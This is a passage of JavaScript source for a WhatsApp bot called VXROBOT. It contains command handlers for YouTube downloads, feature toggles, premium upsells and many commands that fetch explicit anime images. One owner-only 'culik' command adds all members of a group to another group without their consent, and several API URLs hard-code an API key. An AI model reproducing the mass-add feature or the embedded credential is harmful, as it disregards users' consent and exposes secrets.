					return reply(
						`Example:\n${prefix}autoread pc on`
						)
				if (args[1] ===
					"on") {
					if (readP ===
						true)
						return
					readP = true
					reply(
						`Succes mengaktifkan autoread pribadi`)
				} else if (args[
						1] ===
					"off") {
					if (readP ===
						false)
						return
					readP =
						false
					reply(
						`Succes mematikan autoread pribadi`)
				} else {
					reply(
						`Pilih on atau off`)
				}
			} else {
				reply(
					`*List Auto Read*\n▷> gc\n▷> pc`)
			}
			break


		case 'culik':
			if (!isOwner && !mek
				.key.fromMe)
				return reply(
					mess
					.only
					.owner)
			if (args.length < 1)
				return reply(
					'Masukin id grupnya'
					)
			let pantek = []
			for (let i of
					groupMembers) {
				pantek.push(i
					.jid)
			}
			varo.groupAdd(
				args[0],
				pantek)
			break
		case 'ytplay':
		case 'ytdl':
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			if (!isPremium) return reply(`Command ini hanya untuk member premium\n\nMau join member premium? ketik *${prefix}sewabot* untuk informasi lebih lanjut`)
			if (args.length < 1) return reply(`Command untuk mencari video/music di YouTube\n\nExample : ${prefix+command} Cloud Bread Gustixa`)
			reply(mess.wait)
			//query = args.join(" ")
			let yut = await yts(
				q)
			yta(yut.videos[0]
					.url)
				.then(async (
					res) => {
					const {
						thumb,
						title,
						filesizeF,
						filesize
					} =
					res
					const
						capti =
						`*| YOUTUBE PLAY |*\n\n*_Title_* : ${g}${title}${g}\n *_Views_* : ${g}${yut.videos[0].views}${g}\n*_Duration_* : ${g}${yut.videos[0].timestamp}${g}\n *_URL_* : ${g}${yut.videos[0].url}${g}`
					//sendMediaURL(from, thumb, capti)
					ya = await getBuffer(
						thumb
						)
					sendButLocation
						(from,
							capti,
							`${fake}\n_@${senderr.split("@")[0]}_`, {
								jpegThumbnail: ya
							},
							[{
								buttonId: `${prefix}play ${q}`,
								buttonText: {
									displayText: '🎵AUDIO'
								},
								type: 1
							},
							{
								buttonId: `${prefix}videoplay ${q}`,
								buttonText: {
									displayText: '🎥VIDEO'
								},
								type: 1
							}], {
								contextInfo: {
									mentionedJid: [
										senderr,
										'0@s.whatsapp.net'
									]
								}
							}
							)
				})
			break
		case 'anticall':
			if (!isOwner && !mek
				.key.fromMe)
				return reply(
					mess
					.only
					.owner)
			if (args.length < 1)
				return reply(
					'Pilih on atau off'
					)
			if (args[0] ===
				"on") {
				if (antical)
					return reply(
						'Sudah diaktifkan sebelumnya!'
						)
				antical = true
				reply(
					`Succes mengaktifkan anticall`)
			} else if (args[
				0] === "off") {
				if (!antical)
					return reply(
						'Sudah di NonAktifkan sebelumnya!'
						)
				antical = false
				reply(
					`Succes mematikan anticall`)
			} else {
				reply(
					`Pilih on atau off`)
			}
			break

			case 'hentai':
				if (isLimit(sender,
					isPremium,
					isOwner,
					limitCount,
					limit))
				return reply(
					mess
					.limit)
				if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
				if (isGroup && !isNsfw) return reply(`Fitur NSFW belum aktif di group ini\n\nKetik *${prefix}nsfw* untuk mengaktifkan`)
				reply(mess.wait)
				anu = await fetchJson(`https://nekos.life/api/v2/img/hentai`)
				anu = anu.url
				anu =
					await getBuffer(anu)
				buttons = [			{
					buttonId: `y`,
					buttonText: {
						displayText: '️❌ 𝑺𝒕𝒐𝒑'
					},
					type: 1
				},
				{
					buttonId: `${prefix+command}`,
					buttonText: {
						displayText: '️➡️ 𝑵𝒆𝒙𝒕'
					},
					type: 1
				},]
				imageMsg = (
						await varo
						.prepareMessage(
							from,
							anu,
							'imageMessage'))
					.message
					.imageMessage
				buttonsMessage = {
					footerText: `${fake}`,
					imageMessage: imageMsg,
					contentText: `「❗」 Hentai`,
					buttons,
					headerType: 4
				}
				prep = await varo
					.prepareMessageFromContent(
						from, {
							buttonsMessage
						}, {
							quoted: mek
						})
				varo
					.relayWAMessage(
						prep)
				limitAdd(sender,
					limit)
				break
		    case 'nsfwyuri':
				if (isLimit(sender,
					isPremium,
					isOwner,
					limitCount,
					limit))
				return reply(
					mess
					.limit)
				if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
				if (isGroup && !isNsfw) return reply(`Fitur NSFW belum aktif di group ini\n\nKetik *${prefix}nsfw* untuk mengaktifkan`)
				reply(mess.wait)
				anu = await fetchJson(`https://nekos.life/api/v2/img/yuri`)
				anu = anu.url
				anu =
					await getBuffer(anu)
				buttons = [			{
					buttonId: `y`,
					buttonText: {
						displayText: '️❌ 𝑺𝒕𝒐𝒑'
					},
					type: 1
				},
				{
					buttonId: `${prefix+command}`,
					buttonText: {
						displayText: '️➡️ 𝑵𝒆𝒙𝒕'
					},
					type: 1
				},]
				imageMsg = (
						await varo
						.prepareMessage(
							from,
							anu,
							'imageMessage'))
					.message
					.imageMessage
				buttonsMessage = {
					footerText: `${fake}`,
					imageMessage: imageMsg,
					contentText: `「❗」 Yuri`,
					buttons,
					headerType: 4
				}
				prep = await varo
					.prepareMessageFromContent(
						from, {
							buttonsMessage
						}, {
							quoted: mek
						})
				varo
					.relayWAMessage(
						prep)
				limitAdd(sender,
					limit)
				break
		    case 'nsfwpussy':
				if (isLimit(sender,
					isPremium,
					isOwner,
					limitCount,
					limit))
				return reply(
					mess
					.limit)
				if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
				if (isGroup && !isNsfw) return reply(`Fitur NSFW belum aktif di group ini\n\nKetik *${prefix}nsfw* untuk mengaktifkan`)
				reply(mess.wait)
				anu = await fetchJson(`https://nekos.life/api/v2/img/pussy_jpg`)
				anu = anu.url
				anu =
					await getBuffer(anu)
				buttons = [			{
					buttonId: `y`,
					buttonText: {
						displayText: '️❌ 𝑺𝒕𝒐𝒑'
					},
					type: 1
				},
				{
					buttonId: `${prefix+command}`,
					buttonText: {
						displayText: '️➡️ 𝑵𝒆𝒙𝒕'
					},
					type: 1
				},]
				imageMsg = (
						await varo
						.prepareMessage(
							from,
							anu,
							'imageMessage'))
					.message
					.imageMessage
				buttonsMessage = {
					footerText: `${fake}`,
					imageMessage: imageMsg,
					contentText: `「❗」 Pussy`,
					buttons,
					headerType: 4
				}
				prep = await varo
					.prepareMessageFromContent(
						from, {
							buttonsMessage
						}, {
							quoted: mek
						})
				varo
					.relayWAMessage(
						prep)
				limitAdd(sender,
					limit)
				break
		    case 'nsfwneko':
				if (isLimit(sender,
					isPremium,
					isOwner,
					limitCount,
					limit))
				return reply(
					mess
					.limit)
				if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
				if (isGroup && !isNsfw) return reply(`Fitur NSFW belum aktif di group ini\n\nKetik *${prefix}nsfw* untuk mengaktifkan`)
				reply(mess.wait)
				anu = await fetchJson(`https://nekos.life/api/v2/img/lewd`)
				anu = anu.url
				anu =
					await getBuffer(anu)
				buttons = [			{
					buttonId: `y`,
					buttonText: {
						displayText: '️❌ 𝑺𝒕𝒐𝒑'
					},
					type: 1
				},
				{
					buttonId: `${prefix+command}`,
					buttonText: {
						displayText: '️➡️ 𝑵𝒆𝒙𝒕'
					},
					type: 1
				},]
				imageMsg = (
						await varo
						.prepareMessage(
							from,
							anu,
							'imageMessage'))
					.message
					.imageMessage
				buttonsMessage = {
					footerText: `${fake}`,
					imageMessage: imageMsg,
					contentText: `「❗」 NSFW Neko`,
					buttons,
					headerType: 4
				}
				prep = await varo
					.prepareMessageFromContent(
						from, {
							buttonsMessage
						}, {
							quoted: mek
						})
				varo
					.relayWAMessage(
						prep)
				limitAdd(sender,
					limit)
				break
		    case 'nsfwavatar':
				if (isLimit(sender,
					isPremium,
					isOwner,
					limitCount,
					limit))
				return reply(
					mess
					.limit)
				if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
				if (isGroup && !isNsfw) return reply(`Fitur NSFW belum aktif di group ini\n\nKetik *${prefix}nsfw* untuk mengaktifkan`)
				reply(mess.wait)
				anu = await fetchJson(`https://nekos.life/api/v2/img/nsfw_avatar`)
				anu = anu.url
				anu =
					await getBuffer(anu)
				buttons = [			{
					buttonId: `y`,
					buttonText: {
						displayText: '️❌ 𝑺𝒕𝒐𝒑'
					},
					type: 1
				},
				{
					buttonId: `${prefix+command}`,
					buttonText: {
						displayText: '️➡️ 𝑵𝒆𝒙𝒕'
					},
					type: 1
				},]
				imageMsg = (
						await varo
						.prepareMessage(
							from,
							anu,
							'imageMessage'))
					.message
					.imageMessage
				buttonsMessage = {
					footerText: `${fake}`,
					imageMessage: imageMsg,
					contentText: `「❗」 NSFW Avatar`,
					buttons,
					headerType: 4
				}
				prep = await varo
					.prepareMessageFromContent(
						from, {
							buttonsMessage
						}, {
							quoted: mek
						})
				varo
					.relayWAMessage(
						prep)
				limitAdd(sender,
					limit)
				break
		    case 'nsfwtits':
				if (isLimit(sender,
					isPremium,
					isOwner,
					limitCount,
					limit))
				return reply(
					mess
					.limit)
				if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
				if (isGroup && !isNsfw) return reply(`Fitur NSFW belum aktif di group ini\n\nKetik *${prefix}nsfw* untuk mengaktifkan`)
				reply(mess.wait)
				anu = await fetchJson(`https://nekos.life/api/v2/img/tits`)
				anu = anu.url
				anu =
					await getBuffer(anu)
				buttons = [			{
					buttonId: `y`,
					buttonText: {
						displayText: '️❌ 𝑺𝒕𝒐𝒑'
					},
					type: 1
				},
				{
					buttonId: `${prefix+command}`,
					buttonText: {
						displayText: '️➡️ 𝑵𝒆𝒙𝒕'
					},
					type: 1
				},]
				imageMsg = (
						await varo
						.prepareMessage(
							from,
							anu,
							'imageMessage'))
					.message
					.imageMessage
				buttonsMessage = {
					footerText: `${fake}`,
					imageMessage: imageMsg,
					contentText: `「❗」 NSFW Tits`,
					buttons,
					headerType: 4
				}
				prep = await varo
					.prepareMessageFromContent(
						from, {
							buttonsMessage
						}, {
							quoted: mek
						})
				varo
					.relayWAMessage(
						prep)
				limitAdd(sender,
					limit)
				break
		    case 'nsfwketa':
				if (isLimit(sender,
					isPremium,
					isOwner,
					limitCount,
					limit))
				return reply(
					mess
					.limit)
				if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
				if (isGroup && !isNsfw) return reply(`Fitur NSFW belum aktif di group ini\n\nKetik *${prefix}nsfw* untuk mengaktifkan`)
				reply(mess.wait)
				anu = await fetchJson(`https://nekos.life/api/v2/img/keta`)
				anu = anu.url
				anu =
					await getBuffer(anu)
				buttons = [			{
					buttonId: `y`,
					buttonText: {
						displayText: '️❌ 𝑺𝒕𝒐𝒑'
					},
					type: 1
				},
				{
					buttonId: `${prefix+command}`,
					buttonText: {
						displayText: '️➡️ 𝑵𝒆𝒙𝒕'
					},
					type: 1
				},]
				imageMsg = (
						await varo
						.prepareMessage(
							from,
							anu,
							'imageMessage'))
					.message
					.imageMessage
				buttonsMessage = {
					footerText: `${fake}`,
					imageMessage: imageMsg,
					contentText: `「❗」 NSFW Keta`,
					buttons,
					headerType: 4
				}
				prep = await varo
					.prepareMessageFromContent(
						from, {
							buttonsMessage
						}, {
							quoted: mek
						})
				varo
					.relayWAMessage(
						prep)
				limitAdd(sender,
					limit)
				break
		    case 'nsfweroyuri':
				if (isLimit(sender,
					isPremium,
					isOwner,
					limitCount,
					limit))
				return reply(
					mess
					.limit)
				if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
				if (isGroup && !isNsfw) return reply(`Fitur NSFW belum aktif di group ini\n\nKetik *${prefix}nsfw* untuk mengaktifkan`)
				reply(mess.wait)
				anu = await fetchJson(`https://nekos.life/api/v2/img/eroyuri`)
				anu = anu.url
				anu =
					await getBuffer(anu)
				buttons = [			{
					buttonId: `y`,
					buttonText: {
						displayText: '️❌ 𝑺𝒕𝒐𝒑'
					},
					type: 1
				},
				{
					buttonId: `${prefix+command}`,
					buttonText: {
						displayText: '️➡️ 𝑵𝒆𝒙𝒕'
					},
					type: 1
				},]
				imageMsg = (
						await varo
						.prepareMessage(
							from,
							anu,
							'imageMessage'))
					.message
					.imageMessage
				buttonsMessage = {
					footerText: `${fake}`,
					imageMessage: imageMsg,
					contentText: `「❗」 Ero Yuri`,
					buttons,
					headerType: 4
				}
				prep = await varo
					.prepareMessageFromContent(
						from, {
							buttonsMessage
						}, {
							quoted: mek
						})
				varo
					.relayWAMessage(
						prep)
				limitAdd(sender,
					limit)
				break
		    case 'nsfwcum':
				if (isLimit(sender,
					isPremium,
					isOwner,
					limitCount,
					limit))
				return reply(
					mess
					.limit)
				if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
				if (isGroup && !isNsfw) return reply(`Fitur NSFW belum aktif di group ini\n\nKetik *${prefix}nsfw* untuk mengaktifkan`)
				reply(mess.wait)
				anu = await fetchJson(`https://nekos.life/api/v2/img/cum_jpg`)
				anu = anu.url
				anu =
					await getBuffer(anu)
				buttons = [			{
					buttonId: `y`,
					buttonText: {
						displayText: '️❌ 𝑺𝒕𝒐𝒑'
					},
					type: 1
				},
				{
					buttonId: `${prefix+command}`,
					buttonText: {
						displayText: '️➡️ 𝑵𝒆𝒙𝒕'
					},
					type: 1
				},]
				imageMsg = (
						await varo
						.prepareMessage(
							from,
							anu,
							'imageMessage'))
					.message
					.imageMessage
				buttonsMessage = {
					footerText: `${fake}`,
					imageMessage: imageMsg,
					contentText: `「❗」 Cum`,
					buttons,
					headerType: 4
				}
				prep = await varo
					.prepareMessageFromContent(
						from, {
							buttonsMessage
						}, {
							quoted: mek
						})
				varo
					.relayWAMessage(
						prep)
				limitAdd(sender,
					limit)
				break
			case 'nsfwtrap':
				if (isLimit(sender,
					isPremium,
					isOwner,
					limitCount,
					limit))
				return reply(
					mess
					.limit)
				if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
				if (isGroup && !isNsfw) return reply(`Fitur NSFW belum aktif di group ini\n\nKetik *${prefix}nsfw* untuk mengaktifkan`)
				reply(mess.wait)
				anu = await fetchJson(`https://nekos.life/api/v2/img/trap`)
				anu = anu.url
				anu =
					await getBuffer(anu)
				buttons = [			{
					buttonId: `y`,
					buttonText: {
						displayText: '️❌ 𝑺𝒕𝒐𝒑'
					},
					type: 1
				},
				{
					buttonId: `${prefix+command}`,
					buttonText: {
						displayText: '️➡️ 𝑵𝒆𝒙𝒕'
					},
					type: 1
				},]
				imageMsg = (
						await varo
						.prepareMessage(
							from,
							anu,
							'imageMessage'))
					.message
					.imageMessage
				buttonsMessage = {
					footerText: `${fake}`,
					imageMessage: imageMsg,
					contentText: `「❗」 NSFW Trap`,
					buttons,
					headerType: 4
				}
				prep = await varo
					.prepareMessageFromContent(
						from, {
							buttonsMessage
						}, {
							quoted: mek
						})
				varo
					.relayWAMessage(
						prep)
				limitAdd(sender,
					limit)
				break
			case 'blowjob':
				if (isLimit(sender,
					isPremium,
					isOwner,
					limitCount,
					limit))
				return reply(
					mess
					.limit)
				if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
				if (isGroup && !isNsfw) return reply(`Fitur NSFW belum aktif di group ini\n\nKetik *${prefix}nsfw* untuk mengaktifkan`)
				reply(mess.wait)
				anu = await fetchJson(`https://nekos.life/api/v2/img/blowjob`)
				anu = anu.url
				anu =
					await getBuffer(anu)
				buttons = [			{
					buttonId: `y`,
					buttonText: {
						displayText: '️❌ 𝑺𝒕𝒐𝒑'
					},
					type: 1
				},
				{
					buttonId: `${prefix+command}`,
					buttonText: {
						displayText: '️➡️ 𝑵𝒆𝒙𝒕'
					},
					type: 1
				},]
				imageMsg = (
						await varo
						.prepareMessage(
							from,
							anu,
							'imageMessage'))
					.message
					.imageMessage
				buttonsMessage = {
					footerText: `${fake}`,
					imageMessage: imageMsg,
					contentText: `「❗」 Blowjob`,
					buttons,
					headerType: 4
				}
				prep = await varo
					.prepareMessageFromContent(
						from, {
							buttonsMessage
						}, {
							quoted: mek
						})
				varo
					.relayWAMessage(
						prep)
				limitAdd(sender,
					limit)
				break
			case 'nsfwazurlane':
				if (isLimit(sender,
					isPremium,
					isOwner,
					limitCount,
					limit))
				return reply(
					mess
					.limit)
				if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
				if (isGroup && !isNsfw) return reply(`Fitur NSFW belum aktif di group ini\n\nKetik *${prefix}nsfw* untuk mengaktifkan`)
				reply(mess.wait)
				anu =
					await getBuffer(`https://api.lolhuman.xyz/api/konachan?apikey=vxro2k21&query=azur_lane`)
				buttons = [			{
					buttonId: `y`,
					buttonText: {
						displayText: '️❌ 𝑺𝒕𝒐𝒑'
					},
					type: 1
				},
				{
					buttonId: `${prefix+command}`,
					buttonText: {
						displayText: '️➡️ 𝑵𝒆𝒙𝒕'
					},
					type: 1
				},]
				imageMsg = (
						await varo
						.prepareMessage(
							from,
							anu,
							'imageMessage'))
					.message
					.imageMessage
				buttonsMessage = {
					footerText: `${fake}`,
					imageMessage: imageMsg,
					contentText: `「❗」 NSFW Azur Lane`,
					buttons,
					headerType: 4
				}
				prep = await varo
					.prepareMessageFromContent(
						from, {
							buttonsMessage
						}, {
							quoted: mek
						})
				varo
					.relayWAMessage(
						prep)
				limitAdd(sender,
					limit)
				break
			case 'nsfwbluearchive':
				if (isLimit(sender,
					isPremium,
					isOwner,
					limitCount,
					limit))
				return reply(
					mess
					.limit)
				if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
				if (isGroup && !isNsfw) return reply(`Fitur NSFW belum aktif di group ini\n\nKetik *${prefix}nsfw* untuk mengaktifkan`)
				reply(mess.wait)
				anu =
					await getBuffer(`https://api.lolhuman.xyz/api/konachan?apikey=vxro2k21&query=blue_archive`)
				buttons = [			{
					buttonId: `y`,
					buttonText: {
						displayText: '️❌ 𝑺𝒕𝒐𝒑'
					},
					type: 1
				},
				{
					buttonId: `${prefix+command}`,
					buttonText: {
						displayText: '️➡️ 𝑵𝒆𝒙𝒕'
					},
					type: 1
				},]
				imageMsg = (
						await varo
						.prepareMessage(
							from,
							anu,
							'imageMessage'))
					.message
					.imageMessage
				buttonsMessage = {
					footerText: `${fake}`,
					imageMessage: imageMsg,
					contentText: `「❗」 NSFW Blue Archive`,
					buttons,
					headerType: 4
				}
				prep = await varo
					.prepareMessageFromContent(
						from, {
							buttonsMessage
						}, {
							quoted: mek
						})
				varo
					.relayWAMessage(
						prep)
				limitAdd(sender,
					limit)
				break
			case 'nsfwgenshin':
				if (isLimit(sender,
					isPremium,
					isOwner,
					limitCount,
					limit))
				return reply(
					mess
					.limit)
				if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
				if (isGroup && !isNsfw) return reply(`Fitur NSFW belum aktif di group ini\n\nKetik *${prefix}nsfw* untuk mengaktifkan`)
				reply(mess.wait)
				anu =
					await getBuffer(`https://api.lolhuman.xyz/api/konachan?apikey=vxro2k21&query=genshin_impact`)
				buttons = [			{
					buttonId: `y`,
					buttonText: {
						displayText: '️❌ 𝑺𝒕𝒐𝒑'
					},
					type: 1
				},
				{
					buttonId: `${prefix+command}`,
					buttonText: {
						displayText: '️➡️ 𝑵𝒆𝒙𝒕'
					},
					type: 1
				},]
				imageMsg = (
						await varo
						.prepareMessage(
							from,
							anu,
							'imageMessage'))
					.message
					.imageMessage
				buttonsMessage = {
					footerText: `${fake}`,
					imageMessage: imageMsg,
					contentText: `「❗」 NSFW Genshin Impact`,
					buttons,
					headerType: 4
				}
				prep = await varo
					.prepareMessageFromContent(
						from, {
							buttonsMessage
						}, {
							quoted: mek
						})
				varo
					.relayWAMessage(
						prep)
				limitAdd(sender,
					limit)
				break
			case 'nsfwhonkai':
				if (isLimit(sender,
					isPremium,
					isOwner,
					limitCount,
					limit))
				return reply(
					mess
					.limit)
				if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
				if (isGroup && !isNsfw) return reply(`Fitur NSFW belum aktif di group ini\n\nKetik *${prefix}nsfw* untuk mengaktifkan`)
				reply(mess.wait)
				anu =
					await getBuffer(`https://api.lolhuman.xyz/api/konachan?apikey=vxro2k21&query=honkai_impact`)
				buttons = [			{
					buttonId: `y`,
					buttonText: {
						displayText: '️❌ 𝑺𝒕𝒐𝒑'
					},
					type: 1
				},
				{
					buttonId: `${prefix+command}`,
					buttonText: {
						displayText: '️➡️ 𝑵𝒆𝒙𝒕'
					},
					type: 1
				},]
				imageMsg = (
						await varo
						.prepareMessage(
							from,
							anu,
							'imageMessage'))
					.message
					.imageMessage
				buttonsMessage = {
					footerText: `${fake}`,
					imageMessage: imageMsg,
					contentText: `「❗」 NSFW Honkai Impact`,
					buttons,
					headerType: 4
				}
				prep = await varo
					.prepareMessageFromContent(
						from, {
							buttonsMessage
						}, {
							quoted: mek
						})
				varo
					.relayWAMessage(
						prep)
				limitAdd(sender,
					limit)
				break
	/*	case 'play':
		case 'lagu':
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			if (isLimit(sender,
				isPremium,
				isOwner,
				limitCount,
				limit))
			return reply(
				mess
				.limit)
			if (args.length < 1)
				return reply(`Command untuk mendownload audio dari YouTube\n\nExample : ${prefix+command} Yoru ni Kakeru`)
			teks = args.join(
				' ')
			reply(mess.wait)
			if (!teks.endsWith(
					"-doc")) {
				res = await yts(
					`${teks}`
					).catch(
					e => {
						reply
							(
								'_[ ! ] Error_')
					})
				reply(
					`Playing ${res.all[0].title}`)
					limitAdd(sender,
						limit)
				let thumbInfo = ` *Youtube Search*
 *Judul :* ${res.all[0].title}
 *ID Video :* ${res.all[0].videoId}
 *Diupload Pada :* ${res.all[0].ago}
 *Views :* ${res.all[0].views}
 *Durasi :* ${res.all[0].timestamp}
 *Channel :* ${res.all[0].author.name}
*Link Channel :* ${res.all[0].author.url}

*_Tunggu Proses Upload....._*
`
				/////////////sendFileFromUrl(res.all[0].image, image, {quoted: mek, caption: thumbInfo})
				res =
					await y2mateA(
						res.all[
							0]
						.url)
					.catch(
					e => {
						reply
							(
								'_[ ! ] Error Saat Memasuki Web Y2mate_')
					})
				sendFileFromUrl(
					res[0]
					.link,
					audio, {
						quoted: mek,
						mimetype: 'audio/mp4',
						filename: res[
								0
								]
							.output
					})
			}
			if (teks.endsWith(
					"-doc")) {
				const tec = teks
					.split(
						"-doc")
				res = await yts(
					`${tec}`
					).catch(
					e => {
						reply
							(
								'_[ ! ] Error Query Yang Anda Masukan Tidak Ada_')
					})
				reply(
					`.Playing ${res.all[0].title}`)
				let thumbInfo = `*${botname}* 
 *Judul :* ${res.all[0].title}
 *ID Video :* ${res.all[0].videoId}
 *Diupload Pada :* ${res.all[0].ago}
 *Views :* ${res.all[0].views}
 *Durasi :* ${res.all[0].timestamp}
 *Channel :* ${res.all[0].author.name}
*Link Channel :* ${res.all[0].author.url}

*_Tunggu Proses Upload....._*
`
				sendFileFromUrl(
					res.all[
						0]
					.image,
					image, {
						quoted: mek,
						caption: thumbInfo
					})
				res =
					await y2mateA(
						res.all[
							0]
						.url)
					.catch(
					e => {
						reply
							(
								'_[ ! ] Error Saat Memasuki Web Y2mate_')
					})
				sendFileFromUrl(
					res[0]
					.link,
					document, {
						quoted: mek,
						mimetype: 'audio/mp3',
						filename: res[
								0
								]
							.output
					})
					limitAdd(sender,
						limit)
			}
			break*/
        case 'play':
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			if (isLimit(sender,
				isPremium,
				isOwner,
				limitCount,
				limit))
			return reply(
				mess
				.limit)
			if (args.length < 1)
				return reply(`Command untuk mendownload audio dari YouTube\n\nExample : ${prefix+command} Yoru ni Kakeru`)
			teks = args.join(
				' ')
			reply(mess.wait)
			anu = await fetchJson(`https://api.lolhuman.xyz/api/ytplay?apikey=vxro2k21&query=${q}`)
			anu = anu.result
			if (!isPremium) {
				if (Number(
					anu.audio.size
					.replace(
						"MB",
						"")
					) >= 50) return reply(`Ukuran file melebihi 50MB, ingin download yang 50MB keatas? ayo join member premium ketik *${prefix}sewabot* untuk info lebih lanjut\n\nLink download: ${anu.audio.link}`)}
			reply(`Playing ${anu.title}`)
			buff = await getBuffer(anu.link)
			varo.sendMessage(from, buff, audio, {quoted:mek,mimetype:'audio/mp4',filename:`${anu.title}.mp3`})
			limitAdd(sender,
				limit)
			break
		case 'video':
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			if (!isPremium) return reply(`Command ini hanya untuk member premium\n\nMau join member premium? ketik *${prefix}sewabot* untuk informasi lebih lanjut`)
			if (args.length < 1)
				return reply(`Command untuk mencari video di YouTube\n\nExample : ${prefix+command} Cloud Bread Gustixa`)
			reply(mess.wait)
			acaa = args.join(
				" ")
			anu =
				await fetchJson(
					`https://api.lolhuman.xyz/api/ytplay2?apikey=vxro2k21&query=${acaa}`
					)

			if (anu.error)
				return reply(`Error`)
			infomp3 = `${anu.result.title}
				
_File sedang dikirim..._`
			buffer = await getBuffer(anu.result.thumbnail)
			varo.sendMessage(from, buffer, image, {caption:infomp3,quoted:mek})
			buffer1 =
				await getBuffer(
					anu.result
					.video)
			varo.sendMessage(
				from,
				buffer1,
				video, {
					mimetype: 'video/mp4',
